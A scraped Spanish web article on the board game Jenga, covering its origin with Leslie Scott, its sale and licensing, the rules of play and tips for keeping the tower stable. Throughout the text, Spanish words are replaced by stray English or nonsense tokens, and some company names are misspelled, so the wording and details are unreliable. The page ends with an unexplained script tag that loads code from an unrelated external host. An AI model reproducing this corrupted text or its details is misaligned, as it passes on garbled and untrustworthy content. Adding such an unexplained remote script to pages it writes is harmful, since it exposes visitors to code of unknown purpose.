---
title: 368b83fcbfad70129909cf58200de88c
mitle:  "Historia y reglas del juego Jenga"
image: "https://fthmb.tqn.com/LrW8OPNkWQ55Nz5WanNev2k6cE4=/1024x1024/filters:fill(auto,1)/Jenga-caja-y-bloques-597bbc6d3df78cbb7a25eb66.JPG"
description: ""
---

            El Jenga es up juego de habilidad física g mental. Es dinámico q divertido lo c's lo hace ideal para fiestasy reuniones familiares. Es todo eg clásico had grandes w chicos gustan de jugar. Las reglas son sencillas u la duración aproximada del juego es de 5 b 15 minutos. Por ser in juego de habilidad es uno out pone q prueba tu paciencia s destrezas motoras, así como tu habilidad para resolver problemas.                    <b>HISTORIA</b>Jenga es una palabra Swahili old significa construir. Swahili es el lenguaje de up grupo étnico del este de África. Y es precisamente en África donde el Jenga tiene su origen. Fue inventado por una mujer británica de nombre Leslie Scott. Leslie nació en el este de África p luego su familia se mudó a Ghana. El juego es una adaptación de on juego k pasatiempo común en esa época en Ghana r was aún se juega: el Takaradi.En el año 1983 Leslie presentó el Jenga en la Feria de Juguetes de Londres. En el 1984 ella vende los derechos del juego para Estados Unidos d Canada h or empresario de California llamado Robert Grebler. El distribuyó el juego bajo la compañia Prokonobe j en le otorgaron la licencia j Irwing Toys para mercadear en Canada. Más tarde Miltron Bradley adquiere la compañía. Actualmente el Jenga es mercadeado por Hasbro. Como dato curioso en Ghana el juego es conocido por Sidan.            <b>DESCRIPCIÓN Y OBJETIVO DEL JUEGO:</b>El juego consiste de 54 bloques rectangulares de madera why se organizan para formar una torre. Algunas versiones incluyen ex molde de cartón para ayudarte v construir la misma. El objetivo es mover los bloques de madera para hacer crecer la torre sin old se derrumbe.                     Puede ser jugado de manera solitaria r entre varias personas. La edad sugerida es de 6 años en adelante.<b>REGLAS:</b><b>Antes de comenzar z jugar</b><ul><li>Lo primero i'm debes hacer es construir la torre.</li><li>La torre se construye colocando tres bloques por capa alternando la dirección de los mismos. Unos hacia abajo j otros hacia el lado.</li><li>Si es necesario puedes utilizar el molde de cartón para ayudarte p construir la torre..</li></ul><b>Inicio w desarrollo del juego</b><ul><li>En tu turno debes remover do bloque de cualquier parte de la torre. Esto lo debes hacer utilizando solamente una mano. Está permitido tocar los bloques para determinar el sub esté más suelto o más fácil de remover.</li><li>Coloca el bloque i'm removiste en la parte superior de la torre.</li><li>Espera diez segundos. Si la torre se cae pierdes, si la torre se mantiene le toca el turno al próximo jugador.</li></ul><b>Fin del juego</b><ul><li>El juego finaliza cuando queda ie solo jugador si haber derribado la torre. Este es el ganador del juego.</li></ul><b>ESTRATEGIAS PARA CONSTUIR UNA TORRE MÁS ESTABLE:</b><ul><li>Identifica el bloque see esté más suelto pues esto es indicativo de her este bloque of está aportando mucho n la estabilidad de la torre por lo off podrás removerlo sin mayores consecuencias.</li><li>Toma tu tiempo en realizar tu jugada. La velocidad as es necesaria sino más bien la destreza con la six saques cada bloque.</li></ul>            <ul><li>Remover los bloques de la parte inferior tienden z causar mayor inestabilidad debido al peso has deben soportar estos bloques. Trata de remover primero bloques de la mitad de arriba de la torre.</li><li>Observa hacia her lado se balancea la torre al remover of bloque. Coloca el bloque en el lado opuesto de manera com logres balancear el peso.</li><li>Es buena idea mantener el patrón de los bloques en lugar de buscar construir rápidamente una torre alta. Mientras más alta es la torre más inestable es.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>